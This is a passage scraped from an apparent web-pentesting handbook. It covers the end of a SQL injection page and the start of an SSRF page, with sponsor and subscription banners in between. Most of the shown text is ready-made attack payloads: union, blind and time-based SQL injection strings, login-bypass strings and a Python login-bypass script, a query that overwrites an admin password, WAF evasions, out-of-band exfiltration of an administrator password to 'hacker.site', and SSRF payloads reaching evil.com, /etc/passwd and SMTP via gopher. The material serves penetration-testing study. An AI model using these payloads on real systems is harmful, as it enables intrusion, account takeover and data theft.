any)\n.\nIdentifying Back-end\nThe best way to identify the back-end is trying to execute functions of the different back-ends. You could use the\nsleep\nfunctions\nof the previous section or these ones:\n[\n\"conv('a',16,2)=conv('a',16,2)\"\n,\n\"MYSQL\"\n]\n,\n[\n\"connection_id()=connection_id()\"\n,\n\"MYSQL\"\n]\n,\n[\n\"crc32('MySQL')=crc32('MySQL')\"\n,\n\"MYSQL\"\n]\n,\n[\n\"BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)\"\n,\n\"MSSQL\"\n]\n,\n[\n\"@@CONNECTIONS>0\"\n,\n\"MSSQL\"\n]\n,\n[\n\"@@CONNECTIONS=@@CONNECTIONS\"\n,\n\"MSSQL\"\n]\n,\n[\n\"@@CPU_BUSY=@@CPU_BUSY\"\n,\n\"MSSQL\"\n]\n,\n[\n\"USER_ID(1)=USER_ID(1)\"\n,\n\"MSSQL\"\n]\n,\n[\n\"ROWNUM=ROWNUM\"\n,\n\"ORACLE\"\n]\n,\n[\n\"RAWTOHEX('AB')=RAWTOHEX('AB')\"\n,\n\"ORACLE\"\n]\n,\n[\n\"LNNVL(0=123)\"\n,\n\"ORACLE\"\n]\n,\n[\n\"5::int=5\"\n,\n\"POSTGRESQL\"\n]\n,\n[\n\"5::integer=5\"\n,\n\"POSTGRESQL\"\n]\n,\n[\n\"pg_client_encoding()=pg_client_encoding()\"\n,\n\"POSTGRESQL\"\n]\n,\n[\n\"get_current_ts_config()=get_current_ts_config()\"\n,\n\"POSTGRESQL\"\n]\n,\n[\n\"quote_literal(42.5)=quote_literal(42.5)\"\n,\n\"POSTGRESQL\"\n]\n,\n[\n\"current_database()=current_database()\"\n,\n\"POSTGRESQL\"\n]\n,\n[\n\"sqlite_version()=sqlite_version()\"\n,\n\"SQLITE\"\n]\n,\n[\n\"last_insert_rowid()>1\"\n,\n\"SQLITE\"\n]\n,\n[\n\"last_insert_rowid()=last_insert_rowid()\"\n,\n\"SQLITE\"\n]\n,\n[\n\"val(cvar(1))=1\"\n,\n\"MSACCESS\"\n]\n,\n[\n\"IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0\"\n,\n\"MSACCESS\"\n]\n,\n[\n\"cdbl(1)=cdbl(1)\"\n,\n\"MSACCESS\"\n]\n,\n[\n\"1337=1337\"\n,\n\"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\"\n]\n,\n[\n\"'i'='i'\"\n,\n\"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\"\n]\n,\nAlso, if you have access to the output of the query, you could make it\nprint the version of the database\n.\nA continuation we are going to discuss different methods to exploit different kinds of SQL Injection. We will use MySQL as example.\nIdentifying with PortSwigger\nSQL injection cheat sheet | Web Security Academy\nWebSecAcademy\nExploiting Union Based\nDetecting number of columns\nIf you can see the output of the query this is the best way to exploit it.\nFirst of all, wee need to find out the\nnumber\nof\ncolumns\nthe\ninitial request\nis returning. This is because\nboth queries must return the same number of columns\n.\nTwo methods are typically used for this purpose:\nOrder/Group by\nKeep incrementing the number until you get a False response. Even though GROUP BY and ORDER BY have different functionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.\n1\n' ORDER BY 1--+    #True\n1'\nORDER\nBY\n2\n--+    #True\n1\n' ORDER BY 3--+    #True\n1'\nORDER\nBY\n4\n--+    #False - Query is only using 3 columns\n#-1' UNION SELECT 1,2,3--+    True\n1\n' GROUP BY 1--+    #True\n1'\nGROUP\nBY\n2\n--+    #True\n1\n' GROUP BY 3--+    #True\n1'\nGROUP\nBY\n4\n--+    #False - Query is only using 3 columns\n#-1' UNION SELECT 1,2,3--+    True\nUNION SELECT\nSelect more and more null values until the query is correct:\n1\n' UNION SELECT null-- - Not working\n1'\nUNION\nSELECT\nnull\n,\nnull\n-- - Not working\n1\n'\nUNION\nSELECT\nnull\n,\nnull\n,\nnull\n-- - Worked\nYou should use\nnull\nvalues as in some cases the type of the columns of both sides of the query must be the same and null is valid in every case.\nExtract database names, table names and column names\nOn the next examples we are going to retrieve the name of all the databases, the table name of a database, the column names of the table:\n#Database names\n-\n1\n' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata\n‚Äã\n#Tables of a database\n-1'\nUniOn\nSelect\n1\n,\n2\n,\n3\n,\ngRoUp_cOncaT\n(\n0x7c\n,\ntable_name\n,\n0x7C\n)\nfRoM\ninformation_schema\n.\ntables\nwHeRe\ntable_schema\n=\n[\ndatabase\n]\n‚Äã\n#Column names\n-\n1\n'\nUniOn\nSelect\n1\n,\n2\n,\n3\n,\ngRoUp_cOncaT\n(\n0x7c\n,\ncolumn_name\n,\n0x7C\n)\nfRoM\ninformation_schema\n.\ncolumns\nwHeRe\ntable_name\n=\n[\ntable\nname\n]\nThere is a different way to discover this data on every different database, but it's always the same methodology.\nExploiting Hidden Union Based\nIf you can see the output of the query but you can't achieve a union based injection, you are dealing with a hidden union based injection.\nIn this situation you end up with a blind injection. To turn the blind injection to a union based one, you need to extract the query being executed on the backend.\nYou can do so by use of the blind injection and the default tables of your target DBMS. To learn about those default tables read the documentation of your target DBMS.\nAfter extracting the query, you need to adjust your payload accordingly, closing the original query safely. Then append a union query to your payload and start exploiting the newly obtained union based injection.\nComplete Article: https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f\nExploiting Error based\nIf for some reason you\ncannot\nsee the\noutput\nof the\nquery\nbut you can\nsee the error messages\n, you can make this error messages to\nex-filtrate\ndata from the database.\nFollowing a similar flow as in the Union Based exploitation you could manage to dump the DB.\n(\nselect\n1\nand\nrow\n(\n1\n,\n1\n)\n>\n(\nselect\ncount\n(\n*\n),\nconcat\n(\nCONCAT\n(\n@\n@VERSION\n),\n0x3a\n,\nfloor\n(\nrand\n()\n*\n2\n))\nx\nfrom\n(\nselect\n1\nunion\nselect\n2\n)\na\ngroup\nby\nx\nlimit\n1\n))\nExploiting Blind SQLi\nIn this case you cannot see the results of the query or the errors, but you can\ndistinguished\nwhen the query\nreturn\na\ntrue\nor a\nfalse\nresponse because there are different contents on the page.\nIn this case, you can abuse that behaviour to dump the database char by char:\n?id\n=\n1\nAND\nSELECT\nSUBSTR\n(\ntable_name\n,\n1\n,\n1\n)\nFROM\ninformation_schema\n.\ntables\n=\n'A'\nExploiting Error Blind SQLi\nThis is the\nsame case as before\nbut instead of distinguish between a true/false response from the query you can\ndistinguish between\nan\nerror\nin the SQL query or not (maybe because the HTTP server crashes). Therefore, in this case you can force an SQLerror each time you guess correctly the char:\nAND\n(\nSELECT\nIF\n(\n1\n,(\nSELECT\ntable_name\nFROM\ninformation_schema\n.\ntables\n),\n'a'\n))\n-- -\nExploiting Time Based SQLi\nIn this case there\nisn't\nany way to\ndistinguish\nthe\nresponse\nof the query based on the context of the page. But, you can make the page\ntake longer to load\nif the guessed character is correct. We have already saw this technique in use before in order to\nconfirm a SQLi vuln\n.\n1\nand\n(\nselect\nsleep\n(\n10\n)\nfrom\nusers\nwhere\nSUBSTR\n(\ntable_name\n,\n1\n,\n1\n)\n=\n'A'\n)\n#\nStacked Queries\nYou can use stacked queries to\nexecute multiple queries in succession\n. Note that while the subsequent queries are executed, the\nresults\nare\nnot returned to the application\n. Hence this technique is primarily of use in relation to\nblind vulnerabilities\nwhere you can use a second query to trigger a DNS lookup, conditional error, or time delay.\nOracle\ndoesn't support\nstacked queries.\nMySQL, Microsoft\nand\nPostgreSQL\nsupport them:\nQUERY-1-HERE; QUERY-2-HERE\nOut of band Exploitation\nIf\nno-other\nexploitation method\nworked\n, you may try to make the\ndatabase ex-filtrate\nthe info to an\nexternal host\ncontrolled by you. For example, via DNS queries:\nselect\nload_file\n(\nconcat\n(\n'\\\\\\\\'\n,\nversion\n(),\n'.hacker.site\\\\a.txt'\n));\nOut of band data exfiltration via XXE\na\n' UNION SELECT EXTRACTVALUE(xmltype('\n<\n?xml version\n=\n\"1.0\"\nencoding\n=\n\"UTF-8\"\n?\n><!\nDOCTYPE root\n[\n<!\nENTITY\n%\nremote SYSTEM\n\"http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/\"\n>\n%\nremote\n;]\n>\n'),'\n/\nl'\n)\nFROM\ndual\n-- -\nAutomated Exploitation\nCheck the\nSQLMap Cheetsheat\nto exploit a SQLi vulnerability with\nsqlmap\n.\nTech specific info\nWe have already discussed all the ways to exploit a SQL Injection vulnerability. Find some more tricks database technology dependant in this book:\n‚Äã\nMS Access\n‚Äã\n‚Äã\nMSSQL\n‚Äã\n‚Äã\nMySQL\n‚Äã\n‚Äã\nOracle\n‚Äã\n‚Äã\nPostgreSQL\n‚Äã\nOr you will find\na lot of tricks regarding: MySQL, PostgreSQL, Oracle, MSSQL, SQLite and HQL in\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection\n‚Äã\n‚Äã‚Äã‚Äã‚Äã‚Äã\nRootedCON\nis the most relevant cybersecurity event in\nSpain\nand one of the most important in\nEurope\n. With\nthe mission of promoting technical knowledge\n, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.\nRootedCON\nRootedCON\nAuthentication bypass\nList to try to bypass the login functionality:\nLogin bypass List\nAuthentication Bypass (Raw MD5)\nWhen a raw md5 is used, the pass will be queried as a simple string, not a hexstring.\n\"SELECT * FROM admin WHERE pass = '\"\n.\nmd5\n(\n$password\n,\ntrue\n).\n\"'\"\nAllowing an attacker to craft a string with a\ntrue\nstatement such as\n' or 'SOMETHING\nmd5\n(\n\"ffifdyop\"\n,\ntrue\n)\n=\n'or'\n6\nÔøΩ\n]\nÔøΩÔøΩ\n!\nr\n,\nÔøΩÔøΩbÔøΩ\nChallenge demo available at\nhttp://web.jarvisoj.com:32772\n‚Äã\nHash Authentication Bypass\nadmin\n' AND 1=0 UNION ALL SELECT '\nadmin\n', '\n81\ndc9bdb52d04dc20036dbd8313ed055'\nRecommended list\n:\nYou should use as username each line of the list and as password always:\nPass1234.\n(This payloads are also included in the big list mentioned at the beginning of this section)\nsqli-hashbypass.txt\n1KB\nText\nGBK Authentication Bypass\nIF ' is being scaped you can use %A8%27, and when ' gets scaped it will be created: 0xA80x5c0x27 (\n‚ïò'\n)\n%\nA8\n%\n27\nOR\n1\n=\n1\n;\n-- 2\n%\n8\nC\n%\nA8\n%\n27\nOR\n1\n=\n1\n-- 2\n%\nbf'\nor\n1\n=\n1\n-- --\nPython script:\nimport\nrequests\nurl\n=\n\"http://example.com/index.php\"\ncookies\n=\ndict\n(\nPHPSESSID\n=\n'4j37giooed20ibi12f3dqjfbkp3'\n)\ndatas\n=\n{\n\"login\"\n:\nchr\n(\n0xbf\n)\n+\nchr\n(\n0x27\n)\n+\n\"OR 1=1 #\"\n,\n\"password\"\n:\n\"test\"\n}\nr\n=\nrequests\n.\npost\n(\nurl\n,\ndata\n=\ndatas\n,\ncookies\n=\ncookies\n,\nheaders\n=\n{\n'referrer'\n:\nurl\n})\nprint\nr\n.\ntext\nPolyglot injection (multicontext)\nSLEEP\n(\n1\n)\n/*' or SLEEP(1) or '\" or SLEEP(1) or \"*/\nInsert Statement\nModify password of existing object/user\nTo do so you should try to\ncreate a new object named as the \"master object\"\n(probably\nadmin\nin case of users) modifying something:\nCreate user named:\nAdMIn\n(uppercase & lowercase letters)\nCreate a user named:\nadmin=\nSQL Truncation Attack\n(when there is some kind of\nlength limit\nin the username or email) --> Create user with name:\nadmin [a lot of spaces] a\nSQL Truncation Attack\nIf the database is vulnerable and the max number of chars for username is for example 30 and you want to impersonate the user\nadmin\n, try to create a username called: \"\nadmin [30 spaces] a\n\" and any password.\nThe database will\ncheck\nif the introduced\nusername\nexists\ninside the database. If\nnot\n, it will\ncut\nthe\nusername\nto the\nmax allowed number of characters\n(in this case to: \"\nadmin [25 spaces]\n\") and the it will\nautomatically remove all the spaces at the end updating\ninside the database the user \"\nadmin\n\" with the\nnew password\n(some error could appear but it doesn't means that this hasn't worked).\nMore info:\nhttps://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html\n&\nhttps://resources.infosecinstitute.com/sql-truncation-attack/#gref\n‚Äã\nNote: This attack will no longer work as described above in latest MySQL installations. While comparisons still ignore trailing whitespace by default, attempting to insert a string that is longer than the length of a field will result in an error, and the insertion will fail. For more information about about this check\nhttps://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation\n__\nMySQL Insert time based checking\nAdd as much\n','',''\nas you consider to exit the VALUES statement. If delay is executed, you have a SQLInjection.\nname\n=\n','');WAITFOR%20DELAY%20'\n0\n:\n0\n:\n5\n'\n--%20-\nON DUPLICATE KEY UPDATE\nON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:\nInject using payload:\n[email¬†protected]\n\", \"bcrypt_hash_of_qwerty\"), (\"\n[email¬†protected]\n\", \"bcrypt_hash_of_qwerty\") ON DUPLICATE KEY UPDATE password=\"bcrypt_hash_of_qwerty\" --\n‚Äã\nThe query would look like this:\nINSERT INTO users (email, password) VALUES (\"\n[email¬†protected]\n\", \"bcrypt_hash_of_qwerty\"), (\"\n[email¬†protected]\n\", \"bcrypt_hash_of_qwerty\") ON DUPLICATE KEY UPDATE password=\"bcrypt_hash_of_qwerty\" -- \", \"bcrypt_hash_of_your_password_input\");\n‚Äã\nThis query will insert a row for the user ‚Äú\n[email¬†protected]\n‚Äù. It will also insert a row for the user ‚Äú\n[email¬†protected]\n‚Äù.\nBecause this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the `password` column of the already existing row to \"bcrypt_hash_of_qwerty\".\n‚Äã\nAfter this, we can simply authenticate with ‚Äú\n[email¬†protected]\n‚Äù and the password ‚Äúqwerty‚Äù!\nExtract information\nCreating 2 accounts at the same time\nWhen trying to create a new user and username, password and email are needed:\nSQLi payload:\nusername=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -\n‚Äã\nA new user with username=otherUsername, password=otherPassword, email:FLAG will be created\nUsing decimal or hexadecimal\nWith this technique you can extract information creating only 1 account. It is important to note that you don't need to comment anything.\nUsing\nhex2dec\nand\nsubstr\n:\n'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'\nTo get the text you can use:\n__import__\n(\n'binascii'\n).\nunhexlify\n(\nhex\n(\n215573607263\n)[\n2\n:])\nUsing\nhex\nand\nreplace\n(and\nsubstr\n):\n'+(select hex(replace(replace(replace(replace(replace(replace(table_name,\"j\",\" \"),\"k\",\"!\"),\"l\",\"\\\"\"),\"m\",\"#\"),\"o\",\"$\"),\"_\",\"%\")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'\n‚Äã\n'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),\"j\",\" \"),\"k\",\"!\"),\"l\",\"\\\"\"),\"m\",\"#\"),\"o\",\"$\"),\"_\",\"%\")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'\n‚Äã\n#Full ascii uppercase and lowercase replace:\n'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),\"j\",\" \"),\"k\",\"!\"),\"l\",\"\\\"\"),\"m\",\"#\"),\"o\",\"$\"),\"_\",\"%\"),\"z\",\"&\"),\"J\",\"'\n\"\n),\n\"K\"\n,\n\"`\"\n),\n\"L\"\n,\n\"(\"\n),\n\"M\"\n,\n\")\"\n),\n\"N\"\n,\n\"@\"\n),\n\"O\"\n,\n\"$$\"\n),\n\"Z\"\n,\n\"&&\"\n))\nFROM\ninformation_schema\n.\ntables\nWHERE\ntable_schema\n=\ndatabase\n()\nORDER\nBY\ntable_name\nASC\nlimit\n0\n,\n1\n)\n+\n'\n‚Äã\n‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã\nRootedCON\nis the most relevant cybersecurity event in\nSpain\nand one of the most important in\nEurope\n. With\nthe mission of promoting technical knowledge\n, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.\nRootedCON\nRootedCON\nRouted SQL injection\nRouted SQL injection is a situation where the injectable query is not the one which gives output but the output of injectable query goes to the query which gives output. (\nPaper\n)\nExample:\n#Hex of: -1' union select login,password from users-- a\n-\n1\n'\nunion\nselect\n0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061\n-- a\nWAF Bypass\nNo spaces bypass\nNo Space (%20) - bypass using whitespace alternatives\n?id\n=\n1\n%\n09\nand%\n091\n=\n1\n%\n09\n--\n?id\n=\n1\n%\n0\nDand\n%\n0\nD1\n=\n1\n%\n0\nD\n--\n?id\n=\n1\n%\n0\nCand\n%\n0\nC1\n=\n1\n%\n0\nC\n--\n?id\n=\n1\n%\n0\nBand\n%\n0\nB1\n=\n1\n%\n0\nB\n--\n?id\n=\n1\n%\n0\nAand\n%\n0\nA1\n=\n1\n%\n0\nA\n--\n?id\n=\n1\n%\nA0and\n%\nA01\n=\n1\n%\nA0\n--\nNo Whitespace - bypass using comments\n?id\n=\n1\n/*comment*/\nand\n/**/\n1\n=\n1\n/**/--\nNo Whitespace - bypass using parenthesis\n?id\n=\n(\n1\n)\nand\n(\n1\n)\n=\n(\n1\n)\n--\nNo commas bypass\nNo Comma - bypass using OFFSET, FROM and JOIN\nLIMIT 0,1         -> LIMIT 1 OFFSET 0\nSUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).\nSELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d\nGeneric Bypasses\nBlacklist using keywords - bypass using uppercase/lowercase\n?id\n=\n1\nAND\n1\n=\n1\n#\n?id\n=\n1\nAnD\n1\n=\n1\n#\n?id\n=\n1\naNd\n1\n=\n1\n#\nBlacklist using keywords case insensitive - bypass using an equivalent operator\nAND   -> && -> %26%26\nOR    -> || -> %7C%7C\n=     -> LIKE,REGEXP,RLIKE, not < and not >\n> X   -> not between 0 and X\nWHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))\nScientific Notation WAF bypass\nYou can find a more in depth explaination of this trick in\ngosecure blog\n.\nBasically you can use the scientific notation in unexpected ways for the WAF to bypass it:\n-1' or 1.e(1) or '1'='1\n-1' or 1337.1337e1 or '1'='1\n' or 1.e('')=\nBypass Column Names Restriction\nFirst of all, notice that if the\noriginal query and the table where you want to extract the flag from have the same amount of columns\nyou might just do:\n0 UNION SELECT * FROM flag\nIt‚Äôs possible to\naccess the third column of a table without using its name\nusing a query like the following:\nSELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;\n, so in an sqlinjection this would looks like:\n# This is an example with 3 columns that will extract the column number 3\n-1\nUNION SELECT\n0\n,\n0\n,\n0\n, F.3 FROM\n(\nSELECT\n1\n,\n2\n,\n3\nUNION SELECT * FROM demo\n)\nF\n;\nOr using a\ncomma bypass\n:\n# In this case, it's extracting the third value from a 4 values table and returning 3 values in the \"union select\"\n-1\nunion\nselect\n* from\n(\nselect\n1\n)\na\njoin\n(\nselect\n2\n)\nb\njoin\n(\nselect F.3 from\n(\nselect * from\n(\nselect\n1\n)\nq\njoin\n(\nselect\n2\n)\nw\njoin\n(\nselect\n3\n)\ne\njoin\n(\nselect\n4\n)\nr union\nselect\n* from flag limit\n1\noffset\n5\n)\nF\n)\nc\nThis trick was taken from\nhttps://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/\n‚Äã\nWAF bypass suggester tools\nGitHub - m4ll0k/Atlas: Quick SQLMap Tamper Suggester\nGitHub\nOther Guides\n‚Äã\nhttps://sqlwiki.netspi.com/\n‚Äã\n‚Äã\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection\n‚Äã\nBrute-Force Detection List\nAuto_Wordlists/sqli.txt at main ¬∑ carlospolop/Auto_Wordlists\nGitHub\n‚Äã\n‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã\nRootedCON\nis the most relevant cybersecurity event in\nSpain\nand one of the most important in\nEurope\n. With\nthe mission of promoting technical knowledge\n, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.\nRootedCON\nRootedCON\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nServer Side Inclusion/Edge Side Inclusion Injection\nNext\nMS Access SQL Injection\nLast modified\n6mo ago"
    },
    {
        "title": "SSRF (Server Side Request Forgery)",
        "url": "https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery",
        "text": "SSRF (Server Side Request Forgery)\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nServer-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to\ninduce the server-side application to make HTTP requests to an arbitrary domain\nof the attacker's choosing. (From\nhere\n)\nCapture SSRF\nThe first thing you need to do is to capture a SSRF interaction provoked by you. To capture a HTTP or DNS interaction you can use tools such as:\nBurpcollab\n‚Äã\npingb\n‚Äã\n‚Äã\ncanarytokens\n‚Äã\n‚Äã\ninterractsh\n‚Äã\n‚Äã\nhttp://webhook.site\n‚Äã\n‚Äã\nhttps://github.com/teknogeek/ssrf-sheriff\n‚Äã\nWhitelisted Domains Bypass\nUsually you will find that the SSRF is only working in\ncertain whitelisted domains\nor URL. In the following page you have a\ncompilation of techniques to try to bypass that whitelist\n:\nURL Format Bypass\nBypass via open redirect\nIf the server is correctly protected you could\nbypass all the restrictions by exploiting an Open Redirect inside the web page\n. Because the webpage will allow\nSSRF to the same domain\nand probably will\nfollow redirects\n, you can exploit the\nOpen Redirect to make the server to access internal any resource\n.\nRead more here:\nhttps://portswigger.net/web-security/ssrf\n‚Äã\nProtocols\nfile://\nfile:///etc/passwd\ndict://\nThe DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:\ndict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>\nssrf.php?url=dict://attacker:11111/\nSFTP://\nA network protocol used for secure file transfer over secure shell\nssrf.php?url=sftp://evil.com:11111/\nTFTP://\nTrivial File Transfer Protocol, works over UDP\nssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET\nLDAP://\nLightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service.\nssrf.php?url=ldap://localhost:11211/%0astats%0aquit\nGopher://\nUsing this protocol you can specify the\nIP, port and bytes\nyou want the server to\nsend\n. Then, you can basically exploit a SSRF to\ncommunicate with any TCP server\n(but you need to know how to talk to the service first).\nFortunately, you can use\nGopherus\nto create payloads for several services. Additionally,\nremote-method-guesser\ncan be used to create\ngopher\npayloads for\nJava RMI\nservices.\nGopher smtp\nssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%\n[email¬†protected]\n%3E%250d%250aRCPT%20TO%3A%\n[email¬†protected]\n%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%\n[email¬†protected]\n%3E%250d%250aTo%3A%20%\n[email¬†protected]\n%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a\nwill make a request like\nHELO localhost\nMAIL FROM:<\n[email¬†protected]\n>\nRCPT TO:<\n[email¬†protected]\n>\nDATA\nFrom: [Hacker] <\n[email¬†protected]\n>\nTo: <\n[email¬†protected]\n>\nDate: Tue, 15 Sep 2017 17:20:26 -0400\nSubject: Ah Ah AHYou didn't say the magic word !\n.\nQUIT\nGopher HTTP\n#For new lines you can use %0A, %0D%0A\ngopher://\n<\nserver\n>\n:8080/_GET / HTTP/1.0%0A%0A\ngopher://\n<\nserver\n>\n:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body\nGopher SMTP ‚Äî Back connect to 1337\nredirect.php\n<?php\nheader\n(\n\"Location: gopher://hack3r.site:1337/_SSRF%0ATest!\"\n);\n?>\nNow query it\n.\nhttps\n:\n//example.com/?q=http://evil.com/redirect.php.\nSMTP\nFrom\nhttps://twitter.com/har1sec/status/1182255952055164929\n:\n1. connect with SSRF on smtp localhost:25\n2. from the first line get the internal domain name 220\nhttp://blabla.internaldomain.com\nESMTP Sendmail\n3. search\nhttp://internaldomain.com\non github, find subdomains\n4. connect\nCurl URL globbing - WAF bypass\nIf the SSRF is executed by\ncurl\n, curl has a feature called\nURL globbing\nthat could be useful to bypass WAFs. For example in this\nwriteup\nyou can find this example for a\npath traversal via\nfile\nprotocol\n:\nfile:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}\nCapture SSRF Requests\nBurp Collaborator\n‚Äã\nhttp://requestrepo.com/\n‚Äã\n‚Äã\nhttps://app.interactsh.com/\n‚Äã\n‚Äã\nhttps://github.com/stolenusername/cowitness\n‚Äã\nSSRF via Referrer header\nSome applications employ server-side analytics software that tracks visitors. This software often logs the Referrer header in requests, since this is of particular interest for tracking incoming links. Often the analytics software will actually visit any third-party URL that appears in the Referrer header. This is typically done to analyze the contents of referring sites, including the anchor text that is used in the incoming links. As a result, the Referer header often represents fruitful attack surface for SSRF vulnerabilities.\nTo discover this kind of \"hidden\" vulnerabilities you could use the plugin \"\nCollaborator Everywhere\n\" from Burp.\nSSRF via SNI data from certificate\nThe simplest misconfiguration that would allow you to connect to an arbitrary backend would look something like this:\nstream\n{\nserver\n{\nlisten\n443\n;\nresolver\n127.0.0.11\n;\nproxy_pass\n$ssl_preread_server_name:443\n;\nssl_preread\non\n;\n}\n}\nHere, the SNI field value is used directly as the address of the backend.\nWith this insecure configuration, we can\nexploit the SSRF vulnerability simply by specifying the desired IP or domain name in the SNI field\n. For example, the following command would force Nginx to connect to\ninternal.host.com\n:\nopenssl s_client -connecttarget.com:443\n-servername\n\"internal.host.com\"\n-crlf\n‚Äã\nWget file upload\n‚Äã\nSSRF with Command Injection\nIt might be worth trying a payload like:\nurl=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami`\nPDFs Rendering\nIf the web page is automatically creating a PDF with some information you have provided, you can\ninsert some JS that will be executed by the PDF creator\nitself (the server) while creating the PDF and you will be able to abuse a SSRF.\nFind more information here\n.\nFrom SSRF to DoS\nCreate several sessions and try to download heavy files exploiting the SSRF from the sessions.\nSSRF PHP Functions\nPHP SSRF\nSSRF Redirect to Gopher\nFor some exploitations you might need to\nsend a redirect response\n(potentially to use a different protocol like gopher). Here you have different python codes to respond with a redirect:\n# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 